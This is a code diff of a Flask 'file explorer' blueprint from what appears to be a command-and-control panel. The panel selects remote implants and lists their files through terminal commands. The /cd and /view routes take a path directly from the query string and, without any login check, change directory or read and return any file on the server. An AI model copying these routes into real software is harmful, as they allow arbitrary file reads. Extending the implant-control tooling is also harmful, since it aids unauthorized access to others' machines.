@@ -1,62 +1,78 @@
-from cvnt.blueprint_client import *
-from cvnt.blueprint_terminal import *
-from flask import Flask, Blueprint, session, url_for
-from flask import render_template_string, render_template
-from flask import redirect
-from flask import request
-from cvnt.db_operations import *
-import os
-import subprocess
-import shutil
+# Import necessary modules and libraries
+from flask import Blueprint, session, redirect, url_for, render_template, request
+from cvnt.db_operations import get_list
+from wtforms import SelectField
+from cvnt.blueprint_terminal import Terminal, analyze_input
 from flask_wtf import FlaskForm
-from wtforms import HiddenField
+import os
 
+# Define the Blueprint for the file explorer
 explorer = Blueprint('explorer', __name__, template_folder='templates', static_folder='static')
 
+# Define the Menu form class
 class Menu(FlaskForm):
     selected_implant = SelectField('Select Implant', choices=[])
 
-
-# handle root route
+# Handle root route
 @explorer.route('/explorer')
 def root():
+    # Check if the user is authenticated
     if 'authenticated' not in session or not session['authenticated']:
         return redirect(url_for('basic.login_success'))
+    
+    # Default implant ID
     implant_id = "slayyy"
+
+    # Get the list of implants
     implants = get_list()
+
+    # Create Menu form
     menu = Menu()
     menu.selected_implant.choices = implants
-    form = Terminal()
-    if menu.validate_on_submit():
-        form.cmd.data = 'dir'
-        try:
-            implant_id = menu.selected_implant.data
-            #file_list = new(implant_id, form)
-        except AttributeError:
-            implant_id = "slayyy"
-    return render_template('explorer.html', current_working_directory='.', form=Menu,
-         file_list=analyze_input(form, implant_id), implants=implants, implant_id=implant_id) 
 
-# handle 'cd' command
+    # Create Terminal form
+    form = Terminal()
+
+    # Process form submission
+    if menu.validate_on_submit():
+        # Get the selected implant ID from the form
+        implant_id = menu.selected_implant.data
+
+    # Call analyze_input function with the selected implant ID and "ls" command
+    file_list = analyze_input(form, implant_id)
+
+    # Render the template with necessary data
+    return render_template('explorer.html', current_working_directory='.', form=menu,
+                            file_list=file_list, implants=implants, implant_id=implant_id) 
+
+# Handle 'cd' command
 @explorer.route('/cd')
 def cd():
-    # run 'level up' command
+    # Run 'level up' command
     os.chdir(request.args.get('path'))
     
-    # redirect to file manager
+    # Redirect to file manager
     return redirect('/explorer')
 
-# view text files
+# Handle listing files and directories
 @explorer.route('/new', methods=['POST'])
-def new(implant_id, form):
-    # get the file content
-    form.cmd.data = 'dir'
-    reposense = analyze_input(form, implant_id)
-    return reposense
-    
-# view text files
+def new():
+    # Get the selected implant ID from the form data
+    implant_id = request.form['selected_implant']
+
+    # Create a new Terminal form
+    form = Terminal()
+
+    # Call analyze_input function with the selected implant ID and "ls" command
+    file_list = analyze_input(form, implant_id)
+
+    # Render the template with file list
+    return render_template('explorer.html', current_working_directory='.', form=form,
+                           file_list=file_list, implants=get_list(), implant_id=implant_id)
+
+# Handle viewing text files
 @explorer.route('/view')
 def view():
-    # get the file content
+    # Get the file content
     with open(request.args.get('file')) as f:
         return f.read().replace('\n', '<br>')
